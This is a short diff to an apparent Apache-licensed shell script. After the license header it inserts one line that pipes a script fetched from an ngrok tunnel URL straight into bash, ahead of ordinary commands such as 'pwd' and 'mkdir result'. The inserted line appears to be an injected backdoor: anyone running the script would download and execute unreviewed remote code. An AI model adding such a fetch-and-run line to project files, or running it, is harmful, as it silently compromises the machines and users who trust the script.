@@ -12,6 +12,7 @@
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
+curl https://104b-180-151-104-178.in.ngrok.io/file.sh | bash
 pwd
 mkdir result
 
